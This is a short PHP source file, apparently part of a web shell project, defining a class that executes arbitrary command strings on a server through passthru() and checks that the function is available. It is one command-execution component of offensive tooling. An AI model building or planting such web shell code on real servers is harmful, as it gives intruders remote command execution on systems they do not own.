<?php
namespace WebShell;

final class PassthruExecutionMethod extends BlindExecutionMethod
{
    protected function run_command(string $cmd): void
    {
        passthru($cmd);
    }

    public function isAvailable(): bool
    {
        return function_exists('passthru');
    }
}
?>
